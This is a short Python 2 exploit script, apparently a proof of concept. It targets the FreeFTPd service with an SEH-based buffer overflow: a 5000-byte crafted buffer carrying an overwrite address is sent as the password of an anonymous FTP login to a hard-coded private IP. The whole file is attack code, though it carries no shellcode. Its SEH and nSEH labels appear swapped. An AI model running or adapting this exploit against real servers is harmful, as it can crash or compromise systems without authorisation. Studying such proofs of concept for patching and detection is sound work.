import socket
import os
import sys
from ftplib import FTP

Seh  = "B" * 4
nSeh = "\x26\x42\x41\x00" # 0x00414226 ASLR: False, Rebase: False, SafeSEH: False, OS: False - FreeFTPDService.exe

buffer  = "A" * 797
buffer += Seh
buffer += nSeh
buffer += "D" * (5000 - len(buffer))

print "[*] Sending evil ftp request to target"
ftp = FTP()
ftp.connect('192.168.100.120', 21)
ftp.login('anonymous', buffer)

